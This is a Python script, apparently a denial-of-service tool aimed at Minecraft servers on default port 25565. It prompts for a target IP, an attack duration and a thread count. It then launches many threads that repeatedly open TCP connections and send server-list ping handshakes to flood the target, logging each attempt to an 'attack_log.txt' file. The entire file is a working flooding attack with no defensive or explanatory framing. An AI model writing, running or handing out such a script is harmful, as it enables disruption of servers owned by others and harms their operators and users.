import socket
import threading
import time
import logging

# Set up logging
logging.basicConfig(filename='attack_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

# Function to send a ping request to the server
def send_ping_request(server, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # Set a timeout for connection
        sock.connect((server, port))
        sock.send(b'\xFE\x01')  # Send handshake ping request
        sock.close()
        logging.info(f"Successfully pinged {server}:{port}")
    except socket.error as e:
        logging.error(f"Failed to connect to {server}:{port}, error: {e}")
        print(f"\033[91mFailed to connect to {server}:{port}, error: {e}\033[0m")

# Function to repeatedly send ping requests
def attack(server, port, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        send_ping_request(server, port)

# Main function to handle input and start threads
if __name__ == "__main__":
    server_ip = input("Enter server IP: ")
    port = int(input("Enter port (default 25565): ") or 25565)
    duration = int(input("Enter attack duration in seconds: "))
    threads_count = int(input("Enter number of threads: "))

    threads = []
    for _ in range(threads_count):
        thread = threading.Thread(target=attack, args=(server_ip, port, duration))
        thread.start()
        threads.append(thread)
    
    for thread in threads:
        thread.join()

    print("Attack finished.")
